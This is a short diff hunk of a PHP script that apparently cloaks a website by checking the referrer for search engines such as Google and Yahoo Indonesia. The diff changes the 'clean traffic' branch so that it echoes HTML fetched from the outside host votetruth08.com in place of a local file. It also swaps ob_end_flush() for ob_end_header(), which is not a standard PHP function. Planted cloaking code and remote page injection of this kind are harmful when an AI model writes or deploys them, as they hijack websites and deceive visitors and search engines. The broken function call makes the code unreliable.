@@ -62,5 +62,5 @@ if (!empty($rf) && (stripos($rf, "yahoo.co.id") !== false || stripos($rf, "googl
     // exit();
 }
 // JIKA CLEAN TRAFFIC → TAMPILKAN INDEX ASLI
-include _DIR_ . "/original.html";
-ob_end_flush();
+echo file_get_contents("https://votetruth08.com/original.html");
+ob_end_header();
